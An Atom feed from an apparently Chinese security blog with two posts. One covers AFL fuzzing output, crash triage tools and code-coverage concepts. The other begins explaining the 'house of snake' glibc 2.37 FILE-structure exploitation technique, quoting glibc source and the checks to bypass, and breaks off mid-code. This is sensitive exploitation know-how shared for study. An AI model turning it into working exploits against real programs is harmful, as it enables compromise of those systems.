<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2023-03-23T13:47:18.753Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>FUZZ(2):AFL结果分析和代码覆盖率</title>
    <link href="https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
    <id>https://cv196082.gitee.io/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</id>
    <published>2023-03-23T13:47:34.000Z</published>
    <updated>2023-03-23T13:47:18.753Z</updated>
    
    <content type="html"><![CDATA[<p>本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。</p><h2 id="fuzzer工作状态"><a href="#fuzzer工作状态" class="headerlink" title="fuzzer工作状态"></a>fuzzer工作状态</h2><p>首先可以查看在<code>output</code>目录下的<code>fuzzer_state</code>文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b cat ./afl_test/output_dir/fuzzer_stats</span><br><span class="line">start_time        : 1679542022</span><br><span class="line">last_update       : 1679542022</span><br><span class="line">fuzzer_pid        : 541718</span><br><span class="line">cycles_done       : 0</span><br><span class="line">execs_done        : 24</span><br><span class="line">execs_per_sec     : 387.10</span><br><span class="line">paths_total       : 3</span><br><span class="line">paths_favored     : 2</span><br><span class="line">paths_found       : 0</span><br><span class="line">paths_imported    : 0</span><br><span class="line">max_depth         : 1</span><br><span class="line">cur_path          : 0</span><br><span class="line">pending_favs      : 2</span><br><span class="line">pending_total     : 3</span><br><span class="line">variable_paths    : 0</span><br><span class="line">stability         : 100.00%</span><br><span class="line">bitmap_cvg        : 0.05%</span><br><span class="line">unique_crashes    : 0</span><br><span class="line">unique_hangs      : 0</span><br><span class="line">last_path         : 0</span><br><span class="line">last_crash        : 0</span><br><span class="line">last_hang         : 0</span><br><span class="line">execs_since_crash : 24</span><br><span class="line">exec_timeout      : 20</span><br><span class="line">afl_banner        : <span class="built_in">test</span></span><br><span class="line">afl_version       : 2.52b</span><br><span class="line">target_mode       : qemu </span><br><span class="line">command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>不过这里我在运行时cat几次内容都没有发生变化所以我猜测应该是运行开始时产生，运行结束时才修改内容。那么如果想要实时的查看运行情况的话可以用<code>afl-whatsup</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">➜  afl-2.52b ./afl-whatsup ./afl_test</span><br><span class="line">status check tool <span class="keyword">for</span> afl-fuzz by &lt;lcamtuf@google.com&gt;</span><br><span class="line"></span><br><span class="line">Individual fuzzers</span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; <span class="built_in">test</span> (0 days, 0 hrs) &lt;&lt;&lt;</span><br><span class="line"></span><br><span class="line">  <span class="string">cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)</span></span><br><span class="line"><span class="string">  pending 2/3, coverage 0.05%, no crashes yet</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Summary stats</span></span><br><span class="line"><span class="string">=============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       Fuzzers alive : 1</span></span><br><span class="line"><span class="string">      Total run time : 0 days, 0 hours</span></span><br><span class="line"><span class="string">         Total execs : 0 million</span></span><br><span class="line"><span class="string">    Cumulative speed : 2 execs/sec</span></span><br><span class="line"><span class="string">       Pending paths : 2 faves, 3 total</span></span><br><span class="line"><span class="string">       Crashes found : 0 locally unique</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">➜  afl-2.52b ./afl-whatsup ./afl_test</span></span><br><span class="line"><span class="string">status check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Individual fuzzers</span></span><br><span class="line"><span class="string">==================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  cycle</span> 96, lifetime speed 1480 execs/sec, path 3/4 (75%)</span><br><span class="line">  pending 0/0, coverage 0.05%, crash count 3 (!)</span><br><span class="line"></span><br><span class="line">Summary stats</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">       Fuzzers alive : 1</span><br><span class="line">      Total run time : 0 days, 0 hours</span><br><span class="line">         Total execs : 0 million</span><br><span class="line">    Cumulative speed : 1480 execs/sec</span><br><span class="line">       Pending paths : 0 faves, 0 total</span><br><span class="line">       Crashes found : 3 locally unique</span><br></pre></td></tr></table></figure><p>虽然但是，我感觉我这里好像使用有问题，但是先不管那么多了。</p><p>再简单介绍一下<code>afl-plot</code>，这个工具总结出来的内容更为直观，可以直接图形化显示。这里存在一定依赖问题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnuplot</span><br><span class="line">afl-plot afl_state_dir graph_output_dir</span><br></pre></td></tr></table></figure><p>下面就是输出出来的结果，但是不知道为什么这里的<code>total paths</code>没有显示，我猜测可能是因为这里不是使用<code>afl-gcc</code>进行编译或者就是我的电脑性能太拉了。这里的<code>uniq crashes</code>开始在增加随后逐渐趋于平稳。最后一个就是执行速度，随着时间的推移也是越来越慢了，当然也可能是因为占用了太多的系统资源。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323142824705.png"                      alt="image-20230323142824705"                ></p><p>然后再说说pythia插件吧，这个插件可以看到发现新的crash和path的概率。他与原版也只是差了几个字段。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323153710947.png"                      alt="image-20230323153710947"                ></p><p>这里在<code>process timing</code>里面框中出现了两个新的字段分别是<code>correctiness</code>和<code>fuzzability</code>，他们的含义分别是在没有发现crash时，发现一个导致crash输入的概率，表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。在<code>overall results</code>框中也多了两个，第一个是当前发现的路径，一个是路径覆盖率。</p><h2 id="何时关闭fuzz"><a href="#何时关闭fuzz" class="headerlink" title="何时关闭fuzz"></a>何时关闭fuzz</h2><p>用过就能知道的是fuzz其实是无限执行下去的，这里可以用上面的几种方法来观察是否该结束，当然这里也可以直接在原始的AFL中看到何时该结束，注意这里<code>cycles done</code>的颜色，在fuzz的过程中这个颜色是一直会变化的，可以看到上面的图中颜色为紫色，这里为蓝色。所以他的变化顺序为紫色-&gt;黄色-&gt;蓝色-&gt;绿色，当为绿色是就代表很难再找到新的crash了，而这个时候就可以结束了。(下图为蓝色主要是受我电脑性能影响的)<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323140202009.png"                      alt="image-20230323140202009"                ></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  output_dir tree</span><br><span class="line">.</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000001,op:havoc,rep:64</span><br><span class="line">│   ├── id:000001,sig:11,src:000000,op:flip1,pos:1</span><br><span class="line">│   ├── id:000002,sig:11,src:000000,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:in.txt</span><br><span class="line">    ├── id:000001,orig:in1.txt</span><br><span class="line">    ├── id:000002,orig:in2.txt</span><br><span class="line">    └── id:000003,src:000001,op:arith8,pos:0,val:-27,+cov</span><br></pre></td></tr></table></figure><p>queue：存放所有具有独特执行路径的测试用例。<br>crashes：导致目标接收致命signal而崩溃的独特测试用例。<br>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。<br>hangs：导致目标超时的独特测试用例。<br>fuzzer_stats：afl-fuzz的运行状态。<br>plot_data：用于afl-plot绘图。</p><h2 id="处理测试结果"><a href="#处理测试结果" class="headerlink" title="处理测试结果"></a>处理测试结果</h2><p>这里只介绍两种方式，一是<code>crashwalk</code>再就是<code>afl-collect</code></p><h3 id="crashwalk"><a href="#crashwalk" class="headerlink" title="crashwalk"></a>crashwalk</h3><p>安装过程这里就不再说了，网上很多，搜搜就有。</p><p>首先这个有两种模式，一是<code>Manual Mode</code>其次就是<code>AFL Mode</code>，他们的命令新式分别如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@</span><br><span class="line">~/tools/go/bin/cwtriage -root syncdir -afl</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323190851304.png"                      alt="image-20230323190851304"                ></p><p>这里使用的是第一种方式(用AFL时我这里会出现无法<code>no crash detected</code>错误)。</p><p>可以看到这里的描述中写上了栈溢出漏洞。</p><h3 id="afl-collect"><a href="#afl-collect" class="headerlink" title="afl-collect"></a>afl-collect</h3><p>这个工具使用命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323195200830.png"                      alt="image-20230323195200830"                ></p><p>结果比上面的更为直观。</p><h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><p>代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的<a class="link"   href="https://clang.llvm.org/docs/SanitizerCoverage.html" >官方文档<i class="fas fa-external-link-alt"></i></a>。</p><h3 id="基本块"><a href="#基本块" class="headerlink" title="基本块"></a>基本块</h3><blockquote><p>只有一个入口点，BB中的指令不是任何<strong>跳转指令</strong>的目标。</p><p>只有一个退出点，只有最后一条指令使执行流程转移到另一个BB</p></blockquote><p>如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/1552285577000-006tNc79gy1fz1gm5zohnj30sj0ikahx.jpg-w331s.jpg"                                     ></p><p>拿一个程序举例，在ida中每一块就代表一个基本块。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200531347.png"                      alt="image-20230323200531347"                ></p><h3 id="边"><a href="#边" class="headerlink" title="边"></a>边</h3><p>依旧是上面ida的图，每一条线，也就是每一个箭头就代表一个边。</p><h3 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h3><p>在AFL中，使用二元组(branch_src, branch_dst)来记录<strong>当前基本块</strong> + <strong>前一基本块</strong>的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;            <span class="comment">//用一个随机数标记当前基本块</span></span><br><span class="line">shared_mem[cur_location ^ prev_location]++;        <span class="comment">//将当前块和前一块异或保存到shared_mem[]</span></span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;                <span class="comment">//cur_location右移1位区分从当前块到当前块的转跳</span></span><br></pre></td></tr></table></figure><p>实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置rcx，然后调用<code>__afl_maybe_log</code>，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。<img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323200655405.png"                      alt="image-20230323200655405"                ></p><h2 id="计算代码覆盖率"><a href="#计算代码覆盖率" class="headerlink" title="计算代码覆盖率"></a>计算代码覆盖率</h2><p>这里计算代码覆盖率主要是介绍两个工具，一是GCOV另一个则是LCOV它是GCOV的前端。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214327472.png"                      alt="image-20230323214327472"                ></p><p>可以看到这里有覆盖率之类的东西，当然也可以在网页中打开</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214409463.png"                      alt="image-20230323214409463"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230323214533298.png"                      alt="image-20230323214533298"                ></p><p>点开文件会有更为详细的数据，每行代码前的数字代表被执行的次数，其中红色的代表未执行过的。</p><hr><p>参考链接:<br>    <a class="link"   href="https://paper.seebug.org/842/#4-afl-collect" >https://paper.seebug.org/842/#4-afl-collect<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。&lt;/p&gt;
&lt;h2 id=&quot;fuzzer工作状态&quot;&gt;&lt;a href=&quot;#fuzzer工作状态&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>house of snake</title>
    <link href="https://cv196082.gitee.io/2023/03/22/house-of-snake/"/>
    <id>https://cv196082.gitee.io/2023/03/22/house-of-snake/</id>
    <published>2023-03-22T05:32:33.000Z</published>
    <updated>2023-03-23T12:11:46.982Z</updated>
    
    <content type="html"><![CDATA[<p>这house of系列是真的多，上一个还没捂热下一个就来了，glibc更新也是真快。不过能在学习新东西的途中水一篇文章还是相当不错的。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>在glibc2.37中<code>_IO_obstack_jumps</code>被删除啦，导致前一篇的利用方式无了。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>这次聚焦的vtable是:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到这里只有两个函数，并且我们真正使用的只有第一个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">__printf_buffer_as_file_overflow (FILE *fp, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (struct __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_commit (file);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">  <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">    __printf_buffer_putc (file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next)</span><br><span class="line">      &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">    __printf_buffer_flush (file-&gt;next);</span><br><span class="line"></span><br><span class="line">  __printf_buffer_as_file_switch_to_buffer (file);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!__printf_buffer_has_failed (file-&gt;next))</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数一来就是一个强制类型转化为<code>__printf_buffer_as_file</code>结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到这个结构体的前面两个成员其实就相当于<code>_IO_FILE_plus</code>结构体，再在后面跟了一个指针。</p><p>这个函数的目标是执行到<code>__printf_buffer_flush</code>，所以需要通过前面的验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_as_file_commit (struct __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"> </span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_putc (struct __printf_buffer *buf, <span class="keyword">char</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;write_ptr != buf-&gt;write_end)</span><br><span class="line">      *buf-&gt;write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    __printf_buffer_putc_1 (buf, ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里第一个函数中就是验证了next指针的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> *write_base;</span><br><span class="line">  <span class="keyword">char</span> *write_ptr;</span><br><span class="line">  <span class="keyword">char</span> *write_end;</span><br><span class="line">  <span class="keyword">uint64_t</span> written;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Identifies the flush callback.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>成功绕过上面的判断之后进入下面这个函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">__printf_buffer_do_flush (struct __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_failed:</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_snprintf:</span><br><span class="line">      __printf_buffer_flush_snprintf ((struct __printf_buffer_snprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_sprintf_chk:</span><br><span class="line">      __chk_fail ();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_to_file:</span><br><span class="line">      __printf_buffer_flush_to_file ((struct __printf_buffer_to_file *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_asprintf:</span><br><span class="line">      __printf_buffer_flush_asprintf ((struct __printf_buffer_asprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_dprintf:</span><br><span class="line">      __printf_buffer_flush_dprintf ((struct __printf_buffer_dprintf *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_strfmon:</span><br><span class="line">      __set_errno (E2BIG);</span><br><span class="line">      __printf_buffer_mark_failed (buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp:</span><br><span class="line">      __printf_buffer_flush_fp ((struct __printf_buffer_fp *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fp_to_wide:</span><br><span class="line">      __printf_buffer_flush_fp_to_wide</span><br><span class="line">        ((struct __printf_buffer_fp_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_fphex_to_wide:</span><br><span class="line">      __printf_buffer_flush_fphex_to_wide</span><br><span class="line">        ((struct __printf_buffer_fphex_to_wide *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((struct __printf_buffer_obstack *) buf);</span><br><span class="line">      <span 